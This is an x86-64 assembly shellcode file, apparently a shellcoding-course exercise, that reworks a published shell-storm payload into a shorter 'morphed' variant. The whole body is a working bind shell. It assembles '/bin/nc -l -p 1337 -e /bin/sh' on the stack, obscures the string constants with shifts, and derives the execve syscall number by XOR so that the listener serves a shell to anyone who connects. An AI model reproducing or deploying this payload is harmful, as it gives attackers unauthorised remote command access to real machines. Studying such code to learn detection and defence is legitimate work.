; original url    : http://shell-storm.org/shellcode/files/shellcode-822.php
; original length : 131
; morphed length  : 123
; original author : Gaussillusion
; morphed author  : Sandro "guly" Zaccarini SLAE64-1497

global _start
section .text

BITS 64
_start:
; xor rdx,rdx
xor    	rax,rax
mov 	rdi,0x636e2f6e69622fff
shr	rdi,0x08
push 	rdi
mov 	rdi,rsp

mov	rcx,0x68732f6e69622fff
shr	rcx,0x08
push 	rcx
mov	rcx,rsp

; push -e
mov     rbx,0x652dffffffffffff
shr	rbx,0x30
push	rbx
mov	rbx,rsp


; push 1337, because the port is 4byte i can just skip the rotation
;mov	r10,0x37333331ffffffff
;shr 	r10,0x20
;push 	r10
;mov	r10,rsp
push 0x37333331
mov	r10,rsp

mov	r9,0x702dffffffffffff
shr	r9,0x30
push 	r9
mov	r9,rsp

mov 	r8,0x6c2dffffffffffff
shr	r8,0x30
push 	r8
mov	r8,rsp

push	rdx  ;push NULL
push 	rcx  ;push address of 'bin/sh'
push	rbx  ;push address of '-e'
push	r10  ;push address of '1337'
push	r9   ;push address of '-p'
push	r8   ;push address of '-l'
push 	rdi  ;push address of '/bin/nc'

mov    	rsi,rsp

; use a value that is already "close" to my 0x3b and xor
;mov    	al,59
mov al,[r10]
xor al,0xa
syscall

